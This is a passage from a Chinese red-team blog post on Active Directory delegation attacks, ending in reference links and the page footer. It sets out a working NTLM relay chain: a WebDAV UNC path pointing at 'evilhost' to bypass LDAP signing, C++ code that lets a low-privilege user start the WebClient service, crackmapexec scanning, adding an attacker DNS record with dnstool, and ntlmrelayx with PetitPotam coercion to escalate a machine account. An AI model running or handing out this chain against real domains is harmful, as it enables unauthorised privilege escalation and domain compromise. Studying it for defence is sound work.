+<p>WebDAV（Web-based Distributed Authoring and Versioning，基于 Web 的分布式编写和版本控制）是一种基于 HTTP 的通信协议，扩展了几个 HTTP 标准方法，在强制身份验证中，我们可以通过 WebDAV 代替 SMB，并通过以下格式的 UNC 路径访问攻击者的 HTTP 服务器，<strong>从而在 Relay To LDAP/s 中绕过签名</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\\evilhost@80\webdav\test.txt</span><br></pre></td></tr></table></figure>
+
+<p>当对启用 WebDAV 的 UNC 路径触发文件操作时，客户端主机将与 WebDAV 服务器执行如下交互过程：</p>
+<ol>
+<li>客户端发出一个 OPTIONS 方法来发现服务器支持的请求方法</li>
+<li>如果支持 PROPFIND 方法，则发出 PROPFIND 请求来发现目录结构</li>
+<li>如果服务器以 401 Unauthorized 响应并通过 WWW-Authenticate 标头请求 NTLM 身份验证，则 WebDAV 将继续启动 NTLM 质询响应身份验证，最终将 Net-NTLM Hash 提供给服务器</li>
+</ol>
+<p>尽管安装并启用 WebClient 服务是 Workstation 版本系统上的默认设置，但并不适用于 Server 版本系统。在 Server 版本系统上，我们仍然需要通过附加功能来安装并启用 WebDAV 组件。但是低权限用户仍然可以通过调用服务控制管理器（Services Control Manager，SCM）来启动 WebClient 服务：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;evntprov.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">void StartWebClientService()</span><br><span class="line">&#123;</span><br><span class="line">	REGHANDLE hReg;</span><br><span class="line">	bool success &#x3D; false;</span><br><span class="line">	const GUID WebClientServiceTrigger &#x3D;</span><br><span class="line">	&#123; 0x22B6D684, 0xFA63, 0x4578,</span><br><span class="line">	&#123; 0x87, 0xC9, 0xEF, 0xFC, 0xBE, 0x66, 0x43, 0xC7 &#125; &#125;;</span><br><span class="line"></span><br><span class="line">	if (EventRegister(&amp;WebClientServiceTrigger, NULL, NULL, &amp;hReg) &#x3D;&#x3D; ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line">		EVENT_DESCRIPTOR eDesc;</span><br><span class="line">		EventDescCreate(&amp;eDesc, 1, 0, 0, 4, 0, 0, 0);</span><br><span class="line">		success &#x3D; EventWrite(hReg, &amp;eDesc, 0, nullptr) &#x3D;&#x3D; ERROR_SUCCESS;</span><br><span class="line">		EventUnregister(hReg);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; Now wait for the service to be running</span><br><span class="line"></span><br><span class="line">	SC_HANDLE schSCM;</span><br><span class="line">	SC_HANDLE schSvc;</span><br><span class="line">	SERVICE_STATUS ssStatus;</span><br><span class="line">	schSCM &#x3D; OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);</span><br><span class="line">	if (NULL &#x3D;&#x3D; schSCM)</span><br><span class="line">		printf(&quot;[-] Failed OpenSCManager: %d\n&quot;, GetLastError());</span><br><span class="line"></span><br><span class="line">	schSvc &#x3D; OpenService(schSCM, L&quot;WebClient&quot;, SERVICE_QUERY_STATUS);</span><br><span class="line">	if (NULL &#x3D;&#x3D; schSvc)</span><br><span class="line">		printf(&quot;[-] Failed OpenService: %d\n&quot;, GetLastError());</span><br><span class="line">	do</span><br><span class="line">		QueryServiceStatus(schSvc, &amp;ssStatus);</span><br><span class="line">	while (ssStatus.dwCurrentState !&#x3D; SERVICE_RUNNING);</span><br><span class="line">	printf(&quot;[*] WebClient service started.\n&quot;);</span><br><span class="line"></span><br><span class="line">	CloseServiceHandle(schSvc);</span><br><span class="line">	CloseServiceHandle(schSCM);</span><br><span class="line"></span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	StartWebClientService();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在内网对服务进行探测</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 192.168.30.0&#x2F;24 -u tom -p Ab123456 -d test.com  -M webdav</span><br></pre></td></tr></table></figure>
+
+<p>为了能让开启了 WebClient 服务的客户端成功访问到我们，我们需要通过已获取的域用户权限，<strong>在域内为攻击机添加一个 DNS 记录</strong>。因为在默认情况下，WebClient 仅对本地内部网（Local Intranet）或受信任的站点（Trusted Sites）列表中的目标进行身份验证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dnstool.py -u test.com\\tom -p Ab123456 -r evil.test.com -d &lt;kali ip&gt; --action add DC-1.test.com</span><br><span class="line">python3 dnstool.py -u test.com\\tom -p Ab123456 -r evil.test.com -a query DC-1.test.com</span><br></pre></td></tr></table></figure>
+
+<p>攻击机开启ntlmrelayx</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-ntlmrelayx -t ldap:&#x2F;&#x2F;&lt;dc-ip&gt; --delegate-access --escalate-user &#39;TEST$&#39; --no-dump</span><br></pre></td></tr></table></figure>
+
+<p>PetitPotam强制认证</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">impacket-PetitPotam -d test.com -dc-ip &lt;dc-ip&gt; -u tom -p Ab123456 &lt;kali&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Kerberos-Relay-to-LDAP"><a href="#Kerberos-Relay-to-LDAP" class="headerlink" title="Kerberos Relay to LDAP"></a>Kerberos Relay to LDAP</h3><p>参考文章:</p>
+<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/">https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/</a></p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9">https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ShorSec/KrbRelayUp">https://github.com/ShorSec/KrbRelayUp</a></p>
+<blockquote>
+<p>大概意思好像是可以通过 DCOM 或者 DNS 触发 Kerberos Relay, 并使用当前机器账户的 ST 中继至 LDAP 服务从而配置 RBCD/Shadow Credentials</p>
+</blockquote>
+<p>后续研究 Kerberos Relay 再补充</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>委派：</p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://labs.lares.com/fear-kerberos-pt4/">Kerberos IV - Delegations</a></p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://www.chudamax.com/posts/kerberos-102-delegation/">Kerberos 102 - Delegation</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/173477">Kerberos协议探索系列之委派篇</a></p>
+<p><a target="_blank" rel="noopener" href="https://trya9ain.github.io/posts/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/">约束委派</a></p>
+<p><a target="_blank" rel="noopener" href="https://ruyueattention.github.io/2022/06/24/%E5%9F%9F%E5%A7%94%E6%B4%BE/">域委派的原理与利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/kerberos-unconstrained-delegation/">Kerberos协议之非约束委派</a></p>
+<p><a target="_blank" rel="noopener" href="https://y4er.com/posts/kerberos-constrained-delegation/">Kerberos协议之约束委派</a></p>
+<p>委派攻击利用：</p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1591">红队域渗透技术：委派攻击汇总（全）</a></p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/12.%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/01.%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/08.%E5%A7%94%E6%B4%BE.html">委派-D4M1TS</a></p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://blog.zjun.info/tech/kerberos-domain-delegation-attack/">Kerberos 域委派攻击</a></p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/11001">域渗透之委派攻击全集</a></p>
+<p>⭐ <a target="_blank" rel="noopener" href="https://exp10it.io/2023/08/resource-based-constrained-delegation-attack-summary/">基于资源的约束委派 (RBCD) 利用总结</a></p>
+<p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/">kerberos域委派攻击学习</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/370073.html">一篇文章讲清楚什么是委派攻击</a></p>
+<p><a target="_blank" rel="noopener" href="https://whoamianony.top/posts/domain-delegation-attack/">Abusing Domain Delegation to Attack Active Directory</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/06/12/Kerberos%E6%94%BB%E5%87%BB%E9%9D%A2/" rel="prev" title="Kerberos Attacks - Kerberos攻击面">
+                  <i class="fa fa-angle-left"></i> Kerberos Attacks - Kerberos攻击面
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/09/06/NTLM-Attack/" rel="next" title="NTLM - NTLM Attack">
+                  NTLM - NTLM Attack <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
